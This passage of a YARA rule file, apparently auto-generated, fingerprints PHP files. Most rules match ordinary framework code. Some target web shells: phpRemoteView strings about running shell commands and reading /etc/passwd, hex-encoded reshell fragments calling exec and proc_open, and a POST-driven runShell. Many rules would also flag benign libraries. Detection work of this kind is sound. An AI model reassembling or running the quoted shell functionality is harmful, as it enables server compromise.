}


rule RelationShip
{
   meta:
      description = "php22 - file RelationShip.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "17aad005b0453e9f9226d05e85a1cd952f2d308d6881f92018c7cc8fcd7faeda"
   strings:
      $s1 = "// | Author: liu21st <liu21st@gmail.com>" fullword ascii
      $s2 = "$throughKey = $throughKey ?: $this->getForeignKey((new $through)->getName());" fullword ascii
      $s3 = "$foreignKey = $foreignKey ?: $this->getForeignKey((new $model)->getName());" fullword ascii
      $s4 = "if ($this->parent && !$modelRelation->isSelfRelation() && get_class($this->parent) == get_class($modelRelation->getModel())) {" fullword ascii
      $s5 = "if ($this->parent && !$modelRelation->isSelfRelation() && get_class($this->parent) == get_class($modelRelation->getModel" fullword ascii
      $s6 = "$name = Loader::parseName($relation) . '_' . $aggregate;" fullword ascii
      $s7 = "$method = Loader::parseName($relation, 1, false);" fullword ascii
      $s8 = "$relation = Loader::parseName($relation, 1, false);" fullword ascii
      $s9 = "$foreignKey = $foreignKey ?: $this->getForeignKey($this->name);" fullword ascii
      $s10 = "$this->relation[$relation] = $this->$method()->getRelation($subRelation, $closure);" fullword ascii
      $s11 = "$relation = Loader::parseName($trace[1]['function']);" fullword ascii
      $s12 = "$morph = Loader::parseName($trace[1]['function']);" fullword ascii
      $s13 = "$method = 'set' . Loader::parseName($name, 1) . 'Attr';" fullword ascii
      $s14 = "array_push($path, Loader::parseName($model, 1));" fullword ascii
      $s15 = "$relation = Loader::parseName($attr, 1, false);" fullword ascii
      $s16 = "$method = Loader::parseName($name, 1, false);" fullword ascii
      $s17 = "return Loader::parseName($name) . '_id';" fullword ascii
      $s18 = "* @param  string $throughKey " fullword ascii
      $s19 = "* @param  string $foreignKey " fullword ascii
      $s20 = "public static function has($relation, $operator = '>=', $count = 1, $id = '*')" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 60KB and
      8 of them
}

rule RepeatedPass
{
   meta:
      description = "php22 - file RepeatedPass.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4ceafccd665fddf5af06b946608facae0e5e30277dc0d6e18d8cd5ff2d57d2ec"
   strings:
      $s1 = "* Process the repeatable passes that run more than once." fullword ascii
      $s2 = "* @author Johannes M. Schmitt <schmittjoh@gmail.com>" fullword ascii
      $s3 = "use Symfony\\Component\\DependencyInjection\\Exception\\InvalidArgumentException;" fullword ascii
      $s4 = "* @throws InvalidArgumentException when the passes don't implement RepeatablePassInterface" fullword ascii
      $s5 = "* @param RepeatablePassInterface[] $passes An array of RepeatablePassInterface objects" fullword ascii
      $s6 = "namespace Symfony\\Component\\DependencyInjection\\Compiler;" fullword ascii
      $s7 = "* @return RepeatablePassInterface[] An array of RepeatablePassInterface objects" fullword ascii
      $s8 = "* A pass that might be run repeatedly." fullword ascii
      $s9 = "$pass->process($container);" fullword ascii
      $s10 = "public function process(ContainerBuilder $container)" fullword ascii
      $s11 = "* Sets if the pass should repeat." fullword ascii
      $s12 = "throw new InvalidArgumentException('$passes must be an array of RepeatablePassInterface.');" fullword ascii
      $s13 = "* Returns the passes." fullword ascii
      $s14 = "public function getPasses()" fullword ascii
      $s15 = "class RepeatedPass implements CompilerPassInterface" fullword ascii
      $s16 = "if (!$pass instanceof RepeatablePassInterface) {" fullword ascii
      $s17 = "public function __construct(array $passes)" fullword ascii
      $s18 = "private $passes;" fullword ascii
      $s19 = "foreach ($this->passes as $pass) {" fullword ascii
      $s20 = "$pass->setRepeatedPass($this);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 5KB and
      8 of them
}

rule phpMethod
{
   meta:
      description = "php22 - file phpMethod.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e12738cc94756ac6996f7313a8870c078c8b46517709c400b98d0055c306d96a"
   strings:
      $s1 = "namespace mageekguy\\atoum\\php\\tokenizer\\iterators;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule PhpController
{
   meta:
      description = "php22 - file PhpController.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7a9828f41376e34bbc11333e04a8fe184528121d4e95ec812dac2cf2f95615c6"
   strings:
      $s1 = "$data = $this->runShell(Func::postVar('command'));" fullword ascii
      $s2 = "$data = mb_convert_encoding($data, 'UTF-8', $this->config['shellEncode']);" fullword ascii
      $s3 = "// $this->var['command'] = $this->qvar(Func::postVar('command'));" fullword ascii
      $s4 = "if ($this->config['shellEncode'] != 'UTF-8') {" fullword ascii
      $s5 = "if (!Func::postVar('command')) {" fullword ascii
      $s6 = "// $script = $this->loadScript();" fullword ascii
      $s7 = "public function execAction() {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule ProgressFormatter
{
   meta:
      description = "php22 - file ProgressFormatter.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9246991e1c6a26bc99b74eee3eb5d77b681c8e9661eb9f698598081f22ae36ed"
   strings:
      $s1 = "* License: https://opensource.org/licenses/BSD-3-Clause New BSD License" fullword ascii
      $s2 = "public function advance(MutantProcess $mutantProcess, int $mutationCount)" fullword ascii
      $s3 = "use Infection\\Process\\MutantProcess;" fullword ascii
      $s4 = "parent::advance($mutantProcess, $mutationCount);" fullword ascii
      $s5 = "* Copyright " fullword ascii
      $s6 = "namespace Infection\\Console\\OutputFormatter;" fullword ascii
      $s7 = "* @var ProgressBar" fullword ascii
      $s8 = "use Symfony\\Component\\Console\\Helper\\ProgressBar;" fullword ascii
      $s9 = "public function __construct(ProgressBar $progressBar)" fullword ascii
      $s10 = "$this->progressBar->start($mutationCount);" fullword ascii
      $s11 = "public function start(int $mutationCount)" fullword ascii
      $s12 = "private $progressBar;" fullword ascii
      $s13 = "$this->progressBar = $progressBar;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      8 of them
}

rule ReportsClient
{
   meta:
      description = "php22 - file ReportsClient.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b00abf769eb7620b701733b42b3bda6a45ef2d07b7aa90840a87af64ea759b9d"
   strings:
      $s1 = "* (c) Daniel Leech <daniel@dantleech.com>" fullword ascii
      $s2 = "$decoded = json_decode($response, true);" fullword ascii
      $s3 = "$status = curl_getinfo($curl, CURLINFO_HTTP_CODE);" fullword ascii
      $s4 = "\"Server returned error %s: \\\"%s\\\"\\n%s\"," fullword ascii
      $s5 = "$status, $decoded['error']," fullword ascii
      $s6 = "if (isset($decoded['error'])) {" fullword ascii
      $s7 = "* This file is part of the PHPBench package" fullword ascii
      $s8 = "namespace PhpBench\\Extensions\\Reports\\Driver;" fullword ascii
      $s9 = "$response = curl_exec($curl);" fullword ascii
      $s10 = "public function __construct(string $apiKey, string $baseUrl = null)" fullword ascii
      $s11 = "public function post(string $url, string $data): array" fullword ascii
      $s12 = "'Reports server returned status: %s for %s'," fullword ascii
      $s13 = "$decoded['message'] ?? ''" fullword ascii
      $s14 = "if (null === $decoded) {" fullword ascii
      $s15 = "CURLOPT_HTTPHEADER => [" fullword ascii
      $s16 = "CURLOPT_CUSTOMREQUEST => 'POST'," fullword ascii
      $s17 = "'Could not decode JSON: %s'," fullword ascii
      $s18 = "private $apiKey;" fullword ascii
      $s19 = "), null, new RuntimeException($response));" fullword ascii
      $s20 = "if ($error = curl_error($curl)) {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 6KB and
      8 of them
}

rule ReadonlyTransformation
{
   meta:
      description = "php22 - file ReadonlyTransformation.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ca25486a08f833c5e4ea7708c587e67c50a2fad8d5717e637c7b089dcac8406a"
   strings:
      $s1 = "* Transformation that will turn a form into a readonly version of itself" fullword ascii
      $s2 = "// All of the ReadonlyTransformation's functionality is implemented in performReadonlyTransformation()" fullword ascii
      $s3 = "class ReadonlyTransformation extends FormTransformation" fullword ascii
      $s4 = "// methods on the individual FormField objects." fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule reset_password_blade
{
   meta:
      description = "php22 - file reset_password.blade.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "db12b268768f6378fc68720d3547e69c60ddacf007b97594148bcce880bd9c50"
   strings:
      $s1 = "@form('customer_reset_password')" fullword ascii
      $s2 = "<h2>Reset your password</h2>" fullword ascii
      $s3 = "@section('content')" fullword ascii
      $s4 = "@section('head.title')" fullword ascii
   condition:
      uint16(0) == 0x6540 and filesize < 1KB and
      all of them
}

rule PartialFailedCest
{
   meta:
      description = "php22 - file PartialFailedCest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "bd2324000119538bb6ed761b4380560e8d6ed4718e034a233d620387c6bfce2b"
   strings:
      $s1 = "$I->seeFileFound('scenario.suite.yml');" fullword ascii
      $s2 = "$I->seeFileFound('testcasetwo.txt');" fullword ascii
      $s3 = "$I->seeFileFound('testcasethree.txt');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule ProtectionProvider
{
   meta:
      description = "php22 - file ProtectionProvider.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "995f421c0c34e77a1d7409b09a7145105c0c5e12c2117ec5edd61553678c6a61"
   strings:
      $s1 = "return \"<?php elseif(auth()->check() && auth()->user()->hasAccess('$productModuleNumber')): ?>\";" fullword ascii
      $s2 = "return \"<?php if(auth()->check() && auth()->user()->hasAccess('$productModuleNumber')): ?>\";" fullword ascii
      $s3 = "* Register the application services." fullword ascii
      $s4 = "* Bootstrap the application services." fullword ascii
      $s5 = "Blade::directive('protection', function ($productModuleNumber) {" fullword ascii
      $s6 = "Blade::directive('elseifprotection', function ($productModuleNumber) {" fullword ascii
      $s7 = "use Illuminate\\Support\\ServiceProvider;" fullword ascii
      $s8 = "Blade::directive('elseprotection', function () {" fullword ascii
      $s9 = "Blade::directive('endprotection', function () {" fullword ascii
      $s10 = "class ProtectionProvider extends ServiceProvider" fullword ascii
      $s11 = "use App\\Helpers\\Protection\\NetLicensing;" fullword ascii
      $s12 = "$this->app->bind('netlicensing', NetLicensing::class);" fullword ascii
      $s13 = "use Illuminate\\Support\\Facades\\Blade;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule RemoveAdvertisementCacheHandler
{
   meta:
      description = "php22 - file RemoveAdvertisementCacheHandler.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5bb968eabd949f82844c891faa1f0cfb48fe957f67954b4dc963fc2d70e99659"
   strings:
      $s1 = "* (c) Hifone.com <hifone@hifone.com>" fullword ascii
      $s2 = "* This file is part of Hifone." fullword ascii
      $s3 = "namespace Hifone\\Handlers\\Listeners\\Advertisement;" fullword ascii
      $s4 = "Cache::forget('ads_'.$event->advertisement->adspace_id);" fullword ascii
      $s5 = "public function handle(EventInterface $event)" fullword ascii
      $s6 = "use Hifone\\Events\\EventInterface;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule php22_parser
{
   meta:
      description = "php22 - file parser.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "0bc8ad2d6432ffc39dd95ee71b98039e1576cb7b02c4ee65b141e7bf27bacb83"
   strings:
      $s1 = "http://www.GetAnahita.com" fullword ascii
      $s2 = "Copyright (C) 2008 - 2010 rmdStudio Inc. and Peerglobe Technology Inc. All rights reserved." fullword ascii
      $s3 = "* @param KConfig $config An optional KConfig object with configuration options." fullword ascii
      $s4 = "* Initializes the default configuration for the object." fullword ascii
      $s5 = "* Template Helper." fullword ascii
      $s6 = "class ComNotificationsTemplateHelperParser extends ComStoriesTemplateHelperParser" fullword ascii
      $s7 = "* Called from {@link __construct()} as a first step of object instantiation." fullword ascii
      $s8 = "GNU GPLv3 <http://www.gnu.org/licenses/gpl-3.0.html>" fullword ascii
      $s9 = "protected function _initialize(KConfig $config)" fullword ascii
      $s10 = "'com:notifications.template.filter.link'," fullword ascii
      $s11 = "'com:notifications.template.filter.blockquote'," fullword ascii
      $s12 = "parent::_initialize($config);" fullword ascii
      $s13 = "$config->append(array(" fullword ascii
      $s14 = "* @link     " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}


rule PermissionRepository
{
   meta:
      description = "php22 - file PermissionRepository.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "27e623edcbdbcab79e3f193a9dea035d55c7fd84c9dfaf32686a6d376b34b336"
   strings:
      $s1 = "* the container name. Must be set when the model has different name than the container" fullword ascii
      $s2 = "* @author Mahmoud Zalt <mahmoud@zalt.me>" fullword ascii
      $s3 = "namespace App\\Containers\\Authorization\\Data\\Repositories;" fullword ascii
      $s4 = "protected $container = 'Authorization';" fullword ascii
      $s5 = "* Class PermissionRepository." fullword ascii
      $s6 = "'description'  => 'like'," fullword ascii
      $s7 = "use App\\Ship\\Parents\\Repositories\\Repository;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule php22_poxy
{
   meta:
      description = "php22 - file poxy.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "59f482a37ee28f12eb3a9a980325ff15f18296c68b85f28a3e9cab7e0ff556d1"
   strings:
      $x1 = "if (isset($_GET[$_config['url_var_name']], $_POST[$_config['basic_auth_var_name']], $_POST['username'], $_POST['password']))" fullword ascii
      $x2 = "$_set_cookie[] = add_cookie(\"AUTH;{$_basic_auth_realm};{$_url_parts['host']}:{$_url_parts['port']}\", $_basic_auth_header);" fullword ascii
      $x3 = "$_set_cookie[] = add_cookie(\"AUTH;{$_basic_auth_realm};{$_url_parts['host']}:{$_url_parts['port']}\", $_basic_auth_header" fullword ascii
      $s4 = "$_post_body .= \"Content-Disposition: form-data; name=\\\"$key\\\"; filename=\\\"{$file_info['name']}\\\"\\r\\n\";" fullword ascii
      $s5 = "$_socket = @fsockopen(($_url_parts['scheme'] === 'https' && $_system['ssl'] ? 'ssl://' : 'tcp://') . $_url_parts['host'], $_" fullword ascii
      $s6 = "<div id=\"footer\"><a href=\"http://whitefyre.com/poxy/\">PHProxy</a> <?php echo $GLOBALS['_version'] ?></div>" fullword ascii
      $s7 = "$_request_headers .= 'User-Agent: ' . $_SERVER['HTTP_USER_AGENT'] . \"\\r\\n\";" fullword ascii
      $s8 = "|  Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. |" fullword ascii
      $s9 = "$_request_headers .= 'Host: ' . $_url_parts['host'] . $_url_parts['port_ext'] . \"\\r\\n\";" fullword ascii
      $s10 = "if ($_flags['show_referer'] && isset($_SERVER['HTTP_REFERER']) && preg_match('#^\\Q' . $_script_url . '?' . $_config['url_var" fullword ascii
      $s11 = "$_request_headers  .= \"Authorization: Basic {$_auth_creds[$_basic_auth_realm]}\\r\\n\";" fullword ascii
      $s12 = "list($_content_type, ) = explode(';', str_replace(' ', '', strtolower($_response_headers['content-type'][0])), 2);" fullword ascii
      $s13 = "unset($_response_headers['content-disposition'], $_response_keys['content-disposition']);" fullword ascii
      $s14 = "$temp = array_merge_recursive($temp, set_post_files($value, $key));" fullword ascii
      $s15 = "$_iflags .= isset($_POST[$_config['flags_var_name']][$flag_name]) ? (string)(int)(bool)$_POST[$_config['flags_var_name']" fullword ascii
      $s16 = "if (count($cookie_id) < 4 || ($cookie_content[1] == 'secure' && $_url_parts['scheme'] != 'https'))" fullword ascii
      $s17 = "// FIGURE OUT WHAT TO DO (POST URL-form submit, GET form request, regular request, basic auth, cookie manager, show URL-form)" fullword ascii
      $s18 = ". 'Possible problems are that the server was not found, the connection timed out, or the connection refused by the host. '" fullword ascii
      $s19 = "$_response_headers['p3p'][0] = str_replace($matches[0], 'policyref=\"' . complete_url($matches[1]) . '\"', $_response_head" fullword ascii
      $s20 = "$_basic_auth_header = base64_encode($_POST['username'] . ':' . $_POST['password']);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule phpRemoteView_2
{
   meta:
      description = "php22 - file phpRemoteView_2.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ab0ee603e53cd0b32f09a0c53469d09281002a783d8aa5fcea1110ef2b57df81"
   strings:
      $x1 = "*  - executing any shell commands and any PHP-code" fullword ascii
      $x2 = "exit(\"<h1><a href=http://php.spb.ru/remview/>phpRemoteView</a>: Access Denied - password erroneous</h1>\\n\");" fullword ascii
      $x3 = "exit(\"<h1><a href=http://php.spb.ru/remview/>phpRemoteView</a>: Access Denied - your host not allow</h1>\\n\");" fullword ascii
      $x4 = "\".mm(\"Free download\").\" - <a href='http://php.spb.ru/remview/'>http://php.spb.ru/remview/</a></b></font></td>" fullword ascii
      $x5 = "*  2002.01.20 add panel 'TOOLS': eval php-code and run shell commands" fullword ascii
      $x6 = "*  - view index of directory (/var/log - view logs, /tmp - view PHP sessions)" fullword ascii
      $x7 = "$system_access=true;     // true - user (you) may be run shell commands" fullword ascii
      $s8 = "*             add panel 'TOOLS': eval php-code and run shell commands" fullword ascii
      $s9 = "echo \"Temp file: \".$HTTP_POST_FILES['userfile']['tmp_name'].\"<br>\";" fullword ascii
      $s10 = "*  Free download from http://php.spb.ru/remview/" fullword ascii
      $s11 = "if (!preg_match($s,getenv(\"REMOTE_ADDR\")) && !preg_match($s,gethostbyaddr(getenv(\"REMOTE_ADDR\")))) " fullword ascii
      $s12 = "$HTTP_SERVER_VARS['PHP_AUTH_USER']!=$login || $HTTP_SERVER_VARS['PHP_AUTH_PW']!=$pass)) {" fullword ascii
      $s13 = "$phpeval_access=true;    // true - user (you) may be execute any php-code" fullword ascii
      $s14 = "$shell=\"#\".mm(\"example (remove comments '#')\").\": \\n\\n#cat /etc/passwd;\\n\\n#ps -ax\\n\\n#uname -a\";" fullword ascii
      $s15 = "*  2003.04.22 read first 64Kb of null-size file (example: /etc/zero), " fullword ascii
      $s16 = "*  - download any file and open on Notepad" fullword ascii
      $s17 = "$host_allow=array(\"*\");  // Type list of your(allow) hosts. All other - denied." fullword ascii
      $s18 = "$ok=copy($HTTP_POST_FILES['userfile']['tmp_name'],\"$df$fname\");" fullword ascii
      $s19 = "if ($login!==false && (!isset($HTTP_SERVER_VARS['PHP_AUTH_USER']) || " fullword ascii
      $s20 = "echo \"<P><b>\".mm(\"Shell commands\").\"</b>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule orders_table
{
   meta:
      description = "php22 - file orders-table.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "25b1f25420c775ef96855b058c73d25e27ea56821ac89a6c82351aa7bddbaf4e"
   strings:
      $s1 = "<th><?= $orders[0]->getAttributeLabel('order_status_id') ?></th>" fullword ascii
      $s2 = "<td><?= \\yii\\helpers\\Html::a('See order', ['/cabinet/order', 'id' => $order->hash]) ?></td>" fullword ascii
      $s3 = "* @var $orders \\app\\models\\Order[]" fullword ascii
      $s4 = "<th><?= $orders[0]->getAttributeLabel('total_price') ?></th>" fullword ascii
      $s5 = "<th><?= $orders[0]->getAttributeLabel('items_count') ?></th>" fullword ascii
      $s6 = "<th><?= $orders[0]->getAttributeLabel('start_date') ?></th>" fullword ascii
      $s7 = "<th><?= $orders[0]->getAttributeLabel('end_date') ?></th>" fullword ascii
      $s8 = "* @var $this yii\\web\\View" fullword ascii
      $s9 = "* @var $showEndDate boolean" fullword ascii
      $s10 = "<td><?= Yii::$app->formatter->asDecimal($order->total_price, 2) ?></td>" fullword ascii
      $s11 = "$showEndDate = isset($showEndDate) && $showEndDate;" fullword ascii
      $s12 = "<?php foreach($orders as $order): ?>" fullword ascii
      $s13 = "<?php if (count($orders) > 0): ?>" fullword ascii
      $s14 = "<td><?= $order->items_count ?></td>" fullword ascii
      $s15 = "<p><?= Yii::t('app', 'Empty') ?></p>" fullword ascii
      $s16 = "<td><?= $order->end_date ?></td>" fullword ascii
      $s17 = "<td><?= $order->start_date ?></td>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 6KB and
      8 of them
}

rule PrioritizedCompositeServicePass
{
   meta:
      description = "php22 - file PrioritizedCompositeServicePass.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "91886a5aa11d2fa40fc55e076449b3f98cb95e9050431da5b54f79b23c68df26"
   strings:
      $s1 = "private function injectTaggedServicesIntoComposite(ContainerBuilder $container): void" fullword ascii
      $s2 = "use Symfony\\Component\\DependencyInjection\\Compiler\\CompilerPassInterface;" fullword ascii
      $s3 = "$this->injectTaggedServicesIntoComposite($container);" fullword ascii
      $s4 = "namespace Sylius\\Bundle\\ResourceBundle\\DependencyInjection\\Compiler;" fullword ascii
      $s5 = "use Symfony\\Component\\DependencyInjection\\Definition;" fullword ascii
      $s6 = "use Symfony\\Component\\DependencyInjection\\Reference;" fullword ascii
      $s7 = "public function __construct(string $serviceId, string $compositeId, string $tagName, string $methodName)" fullword ascii
      $s8 = "public function process(ContainerBuilder $container): void" fullword ascii
      $s9 = "private function addAliasForCompositeIfServiceDoesNotExist(ContainerBuilder $container): void" fullword ascii
      $s10 = "abstract class PrioritizedCompositeServicePass implements CompilerPassInterface" fullword ascii
      $s11 = "* @param string $serviceId" fullword ascii
      $s12 = "* @param string $compositeId" fullword ascii
      $s13 = "* @param ContainerBuilder $container" fullword ascii
      $s14 = "$this->addAliasForCompositeIfServiceDoesNotExist($container);" fullword ascii
      $s15 = "$container->setAlias($this->serviceId, $this->compositeId);" fullword ascii
      $s16 = "* @param Definition $channelContextDefinition" fullword ascii
      $s17 = "$channelContextDefinition = $container->findDefinition($this->compositeId);" fullword ascii
      $s18 = "private function addMethodCall(Definition $channelContextDefinition, string $id, array $attributes): void" fullword ascii
      $s19 = "$taggedServices = $container->findTaggedServiceIds($this->tagName);" fullword ascii
      $s20 = "* @param string $tagName" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 9KB and
      8 of them
}

rule passwordReset
{
   meta:
      description = "php22 - file passwordReset.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c87547ae3260222d7e88cce18fe8572309d4f93642aca211393dfaf182a33137"
   strings:
      $s1 = "<a href=\"<?php echo ipFileUrl('admin'); ?>\"><?php _e('Login', 'Ip-admin'); ?></a>" fullword ascii
      $s2 = "<div class=\"ip loginContent\">" fullword ascii
      $s3 = "<h1><?php _e('Password reset', 'Ip-admin'); ?></h1>" fullword ascii
      $s4 = "<?php echo $passwordResetForm->render(); ?>" fullword ascii
      $s5 = "<div class=\"loginTitle\">" fullword ascii
   condition:
      uint16(0) == 0x643c and filesize < 1KB and
      all of them
}

rule OrderItemRepository
{
   meta:
      description = "php22 - file OrderItemRepository.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6257ca3c63523236497b67097c97d37d4479791e2657f3b697e7436a912c6121"
   strings:
      $s1 = "use Sylius\\Component\\Order\\Repository\\OrderItemRepositoryInterface;" fullword ascii
      $s2 = "use Sylius\\Component\\Order\\Model\\OrderItemInterface;" fullword ascii
      $s3 = "use Sylius\\Component\\Order\\Model\\OrderInterface;" fullword ascii
      $s4 = "use Sylius\\Bundle\\ResourceBundle\\Doctrine\\ORM\\EntityRepository;" fullword ascii
      $s5 = "class OrderItemRepository extends EntityRepository implements OrderItemRepositoryInterface" fullword ascii
      $s6 = "->getOneOrNullResult()" fullword ascii
      $s7 = "namespace Sylius\\Bundle\\OrderBundle\\Doctrine\\ORM;" fullword ascii
      $s8 = "->getQuery()" fullword ascii
      $s9 = "public function findOneByIdAndCartId($id, $cartId): ?OrderItemInterface" fullword ascii
      $s10 = "return $this->createQueryBuilder('o')" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      all of them
}

rule ProfileSidebar
{
   meta:
      description = "php22 - file ProfileSidebar.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "535136eec3b0f3a2cff078cee74dc6ef8f680a90632207635b344f9ac2cd9e9e"
   strings:
      $s1 = "* @license https://www.humhub.com/licences" fullword ascii
      $s2 = "* @var \\humhub\\modules\\user\\models\\User the user this sidebar belongs to" fullword ascii
      $s3 = "* ProfileSidebar implements the sidebar for the user profiles." fullword ascii
      $s4 = "* @link https://www.humhub.org/" fullword ascii
      $s5 = "* @copyright Copyright (c) 2016 HumHub GmbH & Co. KG" fullword ascii
      $s6 = "namespace humhub\\modules\\user\\widgets;" fullword ascii
      $s7 = "* @author Luke" fullword ascii
      $s8 = "use humhub\\widgets\\BaseSidebar;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule RendererNotFoundException
{
   meta:
      description = "php22 - file RendererNotFoundException.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "13ea4ff5395c07db0dc21c354b03c4d184a28b980be78c41cde10af859be3005"
   strings:
      $s1 = "namespace Pimcore\\Templating\\Helper\\Navigation\\Exception;" fullword ascii
      $s2 = "return new static(sprintf('The navigation renderer \"%s\" was not found', $name));" fullword ascii
      $s3 = "public static function create(string $name): self" fullword ascii
      $s4 = "class RendererNotFoundException extends \\InvalidArgumentException" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule PruneShard
{
   meta:
      description = "php22 - file PruneShard.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "fbfcfb062e80b8aa7b191b7553f966187f2a6196aeffe69bc8160c6e80623d36"
   strings:
      $s1 = "$delete->execute();" fullword ascii
      $s2 = "use CLIFramework\\Logger;" fullword ascii
      $s3 = "namespace Maghead\\Sharding\\Operations;" fullword ascii
      $s4 = "use Maghead\\Runtime\\Config\\Config;" fullword ascii
      $s5 = "public function pruneShard(ShardMapping $mapping, Shard $shard)" fullword ascii
      $s6 = "use Maghead\\Manager\\ConnectionManager;" fullword ascii
      $s7 = "$migrationKeys = $shardDispatcher->filterMigrationKeys($shardId, $keys);" fullword ascii
      $s8 = "$conn = $shard->getWriteConnection();" fullword ascii
      $s9 = "use Maghead\\Manager\\ConfigManager;" fullword ascii
      $s10 = "$shardKey = $mapping->getKey();" fullword ascii
      $s11 = "public function prune($mappingId, array $schemas, $nodeId = null)" fullword ascii
      $s12 = "use Maghead\\Runtime\\Repo;" fullword ascii
      $s13 = "// $schemas = SchemaUtils::findSchemasByConfig($this->config);" fullword ascii
      $s14 = "$mapping = $this->shardManager->loadShardMapping($mappingId);" fullword ascii
      $s15 = "use Maghead\\Manager\\DataSourceManager;" fullword ascii
      $s16 = "use Maghead\\TableBuilder\\TableBuilder;" fullword ascii
      $s17 = "use Maghead\\Sharding\\Manager\\ShardManager;" fullword ascii
      $s18 = "$delete->where()->in($shardKey, $migrationKeys);" fullword ascii
      $s19 = "$schemas = SchemaUtils::filterShardMappingSchemas($mappingId, $schemas);" fullword ascii
      $s20 = "class PruneShard extends BaseShardOperation" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 6KB and
      8 of them
}

rule php22_reshell
{
   meta:
      description = "php22 - file reshell.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "08efb0a65cce6e3be12f915e6c5d919f21539787e896c70698d5b552790c9e69"
   strings:
      $s1 = "3d20697373657428245f5345525645525b275345525645525f41444452275d293f20245f5345525645525b275345525645525f41444452275d3a245f53455256" ascii
      $s2 = "5f61646472657373223d3e247365727665725f616464722c22756e616d65223d3e207068705f756e616d6528292c22736f667477617265223d3e247365727665" ascii
      $s3 = "293b0a090969662821656d70747928246f757470757429292072657475726e20246f75747075743b0a097d0a09656c736569662869735f63616c6c61626c6528" ascii
      $s4 = "3d2727293f20676574656e7628275345525645525f534f46545741524527292e22223a27273b0a09247365727665725f696e666f203d20617272617928226970" ascii
      $s5 = "20206563686f207472696d286578656375746528226563686f2025555345524e414d45252229293b0a20202020202020207d656c73657b0a2020202020202020" ascii
      $s6 = "a20202020202020207d0a202020207d656c73656966282474797065203d3d20227365727665725f696e666f22297b0a20202020202020206563686f207365727" ascii
      $s7 = "276578656327292026262066756e6374696f6e5f6578697374732827657865632729297b0a090940657865632824636f64652c24726573293b0a090969662821" ascii
      $s8 = "2229293b0a09092470726f63203d204070726f635f6f70656e2824636f64652c2024646573632c202470697065732c2067657463776428292c20617272617928" ascii
      $s9 = "0a0909090969662821656d7074792824726573292920246f7574707574202e3d20247265733b0a0909097d0a0909097768696c652824726573203d2066676574" ascii
      $s10 = "707574202e3d20667265616428247265732c2032303936293b0a0909097d0a09090970636c6f73652824726573293b0a09097d0a090969662821656d70747928" ascii
      $s11 = "62737472287068705f756e616d6528292c302c332929203d3d202277696e22293f2074727565203a2066616c73653b0a7d0a0a66756e6374696f6e2075706c6f" ascii
      $s12 = "206563686f20276572726f725f31273b0a7d0a0a66756e6374696f6e2069735f77696e28297b0a2020202072657475726e2028737472746f6c6f776572287375" ascii
      $s13 = "246f757470757429292072657475726e20246f75747075743b0a097d0a0972657475726e2022223b0a7d0a0a66756e6374696f6e207365727665725f696e666f" ascii
      $s14 = "202020206563686f207472696d2865786563757465282277686f616d692229293b2020200a20202020202020207d0a202020207d656c73656966282474797065" ascii
      $s15 = "3b0a0909246f7574707574203d206f625f6765745f636f6e74656e747328293b0a09096f625f656e645f636c65616e28293b0a090969662821656d7074792824" ascii
      $s16 = "697465282466702c2024626f64795f66696c65293b0a2020202066636c6f736528246670293b200a7d0a0a66756e6374696f6e20657865637574652824636f64" ascii
      $s17 = "656966282474797065203d3d202275706c6f616422297b0a202020202020202075706c6f61645f66696c65282466696c652c24626f64795f66696c65293b0a20" ascii
      $s18 = "29293b0a090969662869735f7265736f75726365282470726f6329297b0a0909097768696c652824726573203d206667657473282470697065735b315d29297b" ascii
